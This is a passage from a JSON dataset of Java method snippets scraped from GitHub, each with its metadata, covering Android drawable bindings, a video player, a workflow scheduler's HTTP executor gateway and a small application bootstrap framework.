p0)\n\t{\n\t\tn_setColorFilter (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30761, "method_name": "setColorFilter", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setColorFilter (android.graphics.ColorFilter p0)\n\t{\n\t\tn_setColorFilter (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30762, "method_name": "n_setColorFilter", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_setColorFilter (android.graphics.ColorFilter p0);\n\n\n\tpublic boolean onStateChange (int[] p0)\n\t{\n\t\treturn n_onStateChange (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30763, "method_name": "onStateChange", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onStateChange (int[] p0)\n\t{\n\t\treturn n_onStateChange (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30764, "method_name": "n_onStateChange", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onStateChange (int[] p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30765, "method_name": "monodroidAddReference", "class_name": "FrameRenderer_FrameDrawable", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30766, "method_name": "monodroidClearReferences", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30767, "method_name": "getGSYVideoManager", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoViewBridge", "snippet": "    public GSYVideoViewBridge getGSYVideoManager() {\n        GSYVideoManager.instance().initContext(getContext().getApplicationContext());\n        return GSYVideoManager.instance();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30768, "method_name": "backFromFull", "class_name": "GSYVideoPlayer", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean backFromFull(Context context) {\n        return GSYVideoManager.backFromWindowFull(context);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30769, "method_name": "releaseVideos", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void releaseVideos() {\n        GSYVideoManager.releaseAllVideos();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30770, "method_name": "getFullId", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getFullId() {\n        return GSYVideoManager.FULLSCREEN_ID;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30771, "method_name": "getSmallId", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getSmallId() {\n        return GSYVideoManager.SMALL_ID;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30772, "method_name": "callWithExecutable", "class_name": "ExecutorApiGateway", "params": ["ExecutableFlow", "Executor", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithExecutable(final ExecutableFlow exflow,\n      final Executor executor, final String action) throws ExecutorManagerException {\n    return callWithExecutionId(executor.getHost(), executor.getPort(), action,\n        exflow.getExecutionId(), null, (Pair<String, String>[]) null);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30773, "method_name": "callWithReference", "class_name": "ExecutorApiGateway", "params": ["ExecutionReference", "String", "Pair<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithReference(final ExecutionReference ref, final String action,\n      final Pair<String, String>... params) throws ExecutorManagerException {\n    final Executor executor = ref.getExecutor().get();\n    return callWithExecutionId(executor.getHost(), executor.getPort(), action, ref.getExecId(),\n        null, params);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30774, "method_name": "callWithReferenceByUser", "class_name": "ExecutorApiGateway", "params": ["ExecutionReference", "String", "String", "Pair<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithReferenceByUser(final ExecutionReference ref,\n      final String action, final String user, final Pair<String, String>... params)\n      throws ExecutorManagerException {\n    final Executor executor = ref.getExecutor().get();\n    return callWithExecutionId(executor.getHost(), executor.getPort(), action,\n        ref.getExecId(), user, params);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30775, "method_name": "callWithExecutionId", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "Integer", "String", "Pair<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithExecutionId(final String host, final int port,\n      final String action, final Integer executionId, final String user,\n      final Pair<String, String>... params) throws ExecutorManagerException {\n    try {\n      final List<Pair<String, String>> paramList = new ArrayList<>();\n\n      if (params != null) {\n        paramList.addAll(Arrays.asList(params));\n      }\n\n      paramList\n          .add(new Pair<>(ConnectorParams.ACTION_PARAM, action));\n      paramList.add(new Pair<>(ConnectorParams.EXECID_PARAM, String\n          .valueOf(executionId)));\n      paramList.add(new Pair<>(ConnectorParams.USER_PARAM, user));\n\n      return callForJsonObjectMap(host, port, \"/executor\", paramList);\n    } catch (final IOException e) {\n      throw new ExecutorManagerException(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30776, "method_name": "callForJsonType", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "List<Pair>", "Class<T>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T callForJsonType(final String host, final int port, final String path,\n      final List<Pair<String, String>> paramList, final Class<T> valueType) throws IOException {\n    final String responseString = callForJsonString(host, port, path, paramList);\n    if (null == responseString || responseString.length() == 0) {\n      return null;\n    }\n    return new ObjectMapper().readValue(responseString, valueType);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30777, "method_name": "callForJsonObjectMap", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "List<Pair>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callForJsonObjectMap(final String host, final int port,\n      final String path, final List<Pair<String, String>> paramList) throws IOException {\n    final String responseString =\n        callForJsonString(host, port, path, paramList);\n\n    @SuppressWarnings(\"unchecked\") final Map<String, Object> jsonResponse =\n        (Map<String, Object>) JSONUtils.parseJSONFromString(responseString);\n    final String error = (String) jsonResponse.get(ConnectorParams.RESPONSE_ERROR);\n    if (error != null) {\n      throw new IOException(error);\n    }\n    return jsonResponse;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30778, "method_name": "callForJsonString", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "List<Pair>"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "String", "snippet": "  private String callForJsonString(final String host, final int port, final String path,\n      List<Pair<String, String>> paramList) throws IOException {\n    if (paramList == null) {\n      paramList = new ArrayList<>();\n    }\n\n    @SuppressWarnings(\"unchecked\") final URI uri =\n        ExecutorApiClient.buildUri(host, port, path, true);\n\n    return this.apiClient.httpPost(uri, paramList);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30779, "method_name": "updateExecutions", "class_name": "ExecutorApiGateway", "params": ["Executor", "List<ExecutableFlow>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> updateExecutions(final Executor executor,\n      final List<ExecutableFlow> executions) throws ExecutorManagerException {\n    final List<Long> updateTimesList = new ArrayList<>();\n    final List<Integer> executionIdsList = new ArrayList<>();\n    // We pack the parameters of the same host together before query\n    for (final ExecutableFlow flow : executions) {\n      executionIdsList.add(flow.getExecutionId());\n      updateTimesList.add(flow.getUpdateTime());\n    }\n    final Pair<String, String> updateTimes = new Pair<>(\n        ConnectorParams.UPDATE_TIME_LIST_PARAM,\n        JSONUtils.toJSON(updateTimesList));\n    final Pair<String, String> executionIds = new Pair<>(\n        ConnectorParams.EXEC_ID_LIST_PARAM,\n        JSONUtils.toJSON(executionIdsList));\n\n    return callWithExecutionId(executor.getHost(), executor.getPort(),\n        ConnectorParams.UPDATE_ACTION, null, null, executionIds, updateTimes);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30780, "method_name": "httpPost", "class_name": "ExecutorApiGateway", "params": ["String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String httpPost(String actionUrl, String json) throws Exception{\n    MediaType applicationJson = MediaType.parse(\"application/json;charset=utf-8\");\n    RequestBody requestBody = RequestBody.create(applicationJson, json);\n    //\u8bbe\u7f6e\u94fe\u63a5\u8d85\u65f6 \u8bbe\u7f6e\u5199\u5165\u8d85\u65f6 \u8bbe\u7f6e\u8bfb\u53d6\u8d85\u65f6\n    OkHttpClient okHttpClient = new OkHttpClient.Builder()\n            .connectTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(20, TimeUnit.SECONDS)\n            .readTimeout(20, TimeUnit.SECONDS)\n            .build();\n    Request request = new Request.Builder()\n            .url(actionUrl)\n            .post(requestBody)\n            .build();\n    Call call = okHttpClient.newCall(request);\n    Response response = null;\n    String ret = null;\n    try {\n      response = call.execute();\n      if(response.isSuccessful()) {\n        ret = response.body().string();\n      }\n    } catch (IOException e){\n      throw e;\n    } finally {\n      if(response != null){\n        response.close();\n      }\n    }\n    return ret;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30781, "method_name": "getEnergyCost", "class_name": "ItemRGBUpgrade", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getEnergyCost() {\n        return 10;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemUpgrades/ItemRGBUpgrade.java", "stars": "2", "class_props": {"extends": "ItemUpgradeBlank", "implements": null, "modifiers": ["public"]}}, {"id": 30782, "method_name": "printString", "class_name": "Demo01ObjectMethodReference", "params": ["Printable"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printString(Printable p){\n        p.print(\"Hello\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo05/ObjectMethodReference/Demo01ObjectMethodReference.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30783, "method_name": "main", "class_name": "Demo01ObjectMethodReference", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u8c03\u7528printString\u65b9\u6cd5,\u65b9\u6cd5\u7684\u53c2\u6570Printable\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u6240\u4ee5\u53ef\u4ee5\u4f20\u9012Lambda\u8868\u8fbe\u5f0f\n        printString((s)->{\n            //\u521b\u5efaMethodRerObject\u5bf9\u8c61\n            MethodRerObject obj = new MethodRerObject();\n            //\u8c03\u7528MethodRerObject\u5bf9\u8c61\u4e2d\u7684\u6210\u5458\u65b9\u6cd5printUpperCaseString,\u628a\u5b57\u7b26\u4e32\u6309\u7167\u5927\u5199\u8f93\u51fa\n            obj.printUpperCaseString(s);\n        });\n\n        /*\n            \u4f7f\u7528\u65b9\u6cd5\u5f15\u7528\u4f18\u5316Lambda\n            \u5bf9\u8c61\u662f\u5df2\u7ecf\u5b58\u5728\u7684MethodRerObject\n            \u6210\u5458\u65b9\u6cd5\u4e5f\u662f\u5df2\u7ecf\u5b58\u5728\u7684printUpperCaseString\n            \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u540d\u5f15\u7528\u6210\u5458\u65b9\u6cd5\n         */\n        //\u521b\u5efaMethodRerObject\u5bf9\u8c61\n        MethodRerObject obj = new MethodRerObject();\n        printString(obj::printUpperCaseString);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo05/ObjectMethodReference/Demo01ObjectMethodReference.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30784, "method_name": "requireArgument", "class_name": "Apex", "params": ["boolean", "String", "Object"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireArgument(boolean expression, String template, Object... args) {\n    if (!expression) {\n      throw new IllegalArgumentException(String.format(template, args));\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30785, "method_name": "requireArgument", "class_name": "Apex", "params": ["boolean"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireArgument(boolean expression) {\n    if (!expression) {\n      throw new IllegalArgumentException();\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30786, "method_name": "requireState", "class_name": "Apex", "params": ["boolean"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireState(boolean expression) {\n    if (!expression) {\n      throw new IllegalStateException();\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30787, "method_name": "requireState", "class_name": "Apex", "params": ["boolean", "String", "Object"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireState(boolean expression, String template, Object... args) {\n    if (!expression) {\n      throw new IllegalStateException(String.format(template, args));\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30788, "method_name": "of", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Apex", "snippet": "  public static Apex of() {\n    return new Apex();\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30789, "method_name": "verbose", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean verbose() {\n    return this.verbose;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30790, "method_name": "realtimeLogging", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean realtimeLogging() {\n    return this.realtimeLogging;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30791, "method_name": "environment", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Environment", "snippet": "  public Environment environment() {\n    return environment;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30792, "method_name": "masterConfig", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean masterConfig() {\n    return masterConfig;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30793, "method_name": "envName", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String envName() {\n    return envName;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30794, "method_name": "bootCls", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> bootCls() {\n    return bootCls;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30795, "method_name": "mainArgs", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] mainArgs() {\n    return mainArgs;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30796, "method_name": "discoverer", "class_name": "Apex", "params": ["Discoverer"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex discoverer(Discoverer discoverer) {\n    requireArgument(this.discoverer == null, \"Discoverer can't be null\");\n    this.discoverer = Objects.requireNonNull(discoverer);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30797, "method_name": "packages", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex packages(String scanPath) {\n    requireArgument(scanPath.contains(\".\"), \"Need correct format\");\n    this.scanPath = Objects.requireNonNull(scanPath);\n    this.packages.add(Objects.requireNonNull(scanPath));\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30798, "method_name": "packages", "class_name": "Apex", "params": ["Collection<String>"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex packages(Collection<String> packages) {\n    if (!packages.isEmpty()) {\n      this.packages.addAll(packages);\n    }\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30799, "method_name": "skipPath", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex skipPath(String skipPath) {\n    requireArgument(skipPath.contains(\".\"), \"Need correct format\");\n    this.skipPaths.add(Objects.requireNonNull(skipPath));\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30800, "method_name": "skipPath", "class_name": "Apex", "params": ["Collection<String>"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex skipPath(Collection<String> skipPaths) {\n    if (!skipPaths.isEmpty()) {\n      this.skipPaths.addAll(skipPaths);\n    }\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30801, "method_name": "removeListener", "class_name": "Apex", "params": ["RemoveListener<K,V>"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public <K, V> Apex removeListener(RemoveListener<K, V> removeListener) {\n    requireArgument(removeListener != null, \"RemoveListener can't be null\");\n    RemoveListener<K, V> kvRemoveListener = requireNonNull(removeListener);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30802, "method_name": "environment", "class_name": "Apex", "params": ["Environment"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex environment(Environment environment) {\n    requireArgument(this.environment == null, \"Environment can't be null\");\n    this.environment = Objects.requireNonNull(environment);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30803, "method_name": "resolver", "class_name": "Apex", "params": ["BeanResolver"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex resolver(BeanResolver beanResolver) {\n    requireArgument(this.beanResolver == null, \"BeanResolver can't be null\");\n    this.beanResolver = Objects.requireNonNull(beanResolver);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30804, "method_name": "options", "class_name": "Apex", "params": ["Options"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex options(Options options) {\n    requireArgument(this.options == null, \"Optional can't be null\");\n    this.options = Objects.requireNonNull(options);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30805, "method_name": "start", "class_name": "Apex", "params": ["Class<T>", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <T> void start(Class<T> bootCls, String[] mainArgs) {\n    requireNonNull(bootCls, \"Apex needs to specify the startup class when starting.\");\n\n    Optional.of(options).orElseGet(this::buildOptions);\n\n    this.bootCls = bootCls;\n    this.scanPath = bootCls.getPackageName();\n\n    try {\n      this.loadConfig(mainArgs);\n      this.singleExecutor();\n    } catch (IllegalAccessException e) {\n      log.error(\"An exception occurred while loading the configuration\", e);\n    }\n    try {\n      final Thread bootThread = new Thread(performScan());\n      final String threadName = this.environment.get(PATH_APP_THREAD_NAME, SERVER_THREAD_NAME);\n      bootThread.setName(threadName);\n      this.singleExecutor.execute(bootThread);\n    } catch (Exception e) {\n      log.error(\"Bean resolve be exception:\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30806, "method_name": "singleExecutor", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void singleExecutor() {\n    this.singleExecutor = Executors.newCachedThreadPool(\n            new ApexThreadFactory(SINGLE_EXECUTOR_NAME));\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30807, "method_name": "buildOptions", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ClassgraphOptions", "snippet": "  private ClassgraphOptions buildOptions() {\n    return ClassgraphOptions.builder()\n            .verbose(verbose)\n            .scanPackages(packages)\n            .skipPackages(skipPaths)\n            .realtimeLogging(realtimeLogging)\n            .build();\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30808, "method_name": "performScan", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Runnable", "snippet": "  private Runnable performScan() {\n    return () -> {\n      if (Objects.isNull(discoverer)) this.discoverer = new ClassgraphDiscoverer(options);\n      Set<Class<?>> discover = this.discoverer.discover(scanPath);\n      Optional.of(beanResolver).orElseGet(DefaultBeanResolver::new);\n      this.beanResolver.resolve(discover);\n    };\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30809, "method_name": "loadConfig", "class_name": "Apex", "params": ["String"], "throws": ["IllegalAccessException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void 